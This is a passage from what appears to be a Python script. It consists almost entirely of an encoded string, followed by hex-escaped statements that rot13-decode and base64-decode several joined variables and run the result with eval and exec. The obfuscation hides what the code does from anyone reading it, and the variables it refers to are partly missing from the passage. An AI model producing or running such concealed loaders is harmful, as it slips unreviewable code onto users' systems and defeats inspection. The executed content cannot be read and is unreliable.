nV4cnV4cJKKQNmZ1fmAz3vyMevyMQvyMQvyMQvyMQvyM3vybwvybwvyMGvyMQvyMQvyMQvyM0t4cnV4cnV4cJH4cJD4cJD4cnV4cnV4cJE4cnV4cnV4cJE4cJn4cJD4cJD4cJD4cJD4cnV4cnV4cJE4cnV4cnV4cJH4cJD4cJD4cnV4cnV4cJEWlxXVPO0nJ1yYaAfMJIjXQNhAFxXVPOjpzyhqPtaKQNmZ1fmAJ3vybwvybwvyMRtVBXJvBXJvBXIxrXJvBXJvBXJvBXJvBXJvBXJvBXIyBXIarXJvBXJvBXIyBXIaFQvybwvybwvyMptVSjjZmAoZmMgVPNt4cnV4cnV4cJEVPNtVPQvybwvybwvyMRtVBXJvBXJvBXIxrXJvBXJvBXIxrXJvBXJvBXJvBXJvBXJvBXJvBXJvBXIxrXJvBXJvBXIxFNt4cnV4cnV4cJEWlxXVPO0nJ1yYaAfMJIjXQNhAFxXVPOjpzyhqPtaKQNmZ1fmAJ3vyMevyMQvyM0tVBXIzhXIxBXIarXIzhXIxBXIxBXIxBXIxBXIxBXIaFQvyMevyMQvyM0tVBXIzhXIxBXIaFNtKQNmZ1fmAz0tVPQvyMevyMQvyM0tVPNtVBXIzhXIxBXIaFNt4cJn4cJD4cJq4cJn4cJD4cJq4cJn4cJD4cJD4cJD4cJD4cJD4cJD4cJq4cJn4cJD4cJqVPQvyMevyMQvyM0aXDbtVUOlnJ50XPqpZQZmJmZmoFNtVPNtVPNgYF0gYF0gYF0gsRW5BvOSqKWioaygo3H1sP0gYF0gYF0gYF0aXDbtVUOlnJ50XPqpZQZmJmZkoIkhJ35qVSAyoTIwqPO5o3IlVTkuozq1LJqyBvpcPvNtpUWcoaDbVvVvPvNtJmSqVSAjLJ5cp2ttXRImpTUQfJ9fXDbtVSflKFOSozqfnKAbVPuWozqfMKZcPvNtVvVvXDbtVTRtCFOcoaO1qPtaKT4+CvNaXDbtVTyzVTRtCG0tVwRvBtbtVPNtq2y0nPOipTIhXPqwo25znJphqUu0WljtW3paXFOuplOwo25znJp6PvNtVPNtVTAiozMcMl53pzy0MFtap3OuozymnPpcPvNtVPOwo25znJphL2kip2HbXDbtVPNtpUWcoaDbW1khKQNmZ1fmZz1oVBXpyB+4wlNtKFOQo25znJq1pzSwnJ9hVTq1LKWxLJEuVTIhBvOwo25znJphqUu0WlxXVPNtVUEcoJHhp2kyMKNbZvxXVPNtVUAjLJ5cp2ugMJ51XPxXVPOyoTyzVTRtCG0tVwVvBtbtVPNtq2y0nPOipTIhXPqwo25znJphqUu0WljtW3paXFOuplOwo25znJp6PvNtVPNtVTAiozMcMl53pzy0MFtaMJ5aoTymnPpcPvNtVPOwo25znJphL2kip2HbXDbtVPNtpUWcoaDbW1khKQNmZ1fmZz1oVBXpyB+4wlNtKFOQo25znJq1pzS0nJ9hVUAuqzIxVTyhBvOwo25znJphqUu0WlxXVPNtVUEcoJHhp2kyMKNbZvxXVPNtVTIhM2kcp2ugMJ51XPxXVPOyoUAyBtbtVPNtL29hMzyaXPxXPzyzVT9mYaOuqTthnKAznJkyXPqwo25znJphqUu0Wlx6PvNtVPOzVQ0to3OyovtaL29hMzyaYaE4qPpfVPqlWlxXVPNtVTkuozptCFOzYaWyLJEfnJ5ypltcPvNtVPOcMvNvp3OuozymnPVtnJ4toTShMmbXVPNtVPNtp3OuozymnT1yoaHbXDbtVPNtMJkcMvNvMJ5aoTymnPVtnJ4toTShMmbXVPNtVPNtMJ5aoTymnT1yoaHbXDcyoUAyBtbtVTAiozMcMltc'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
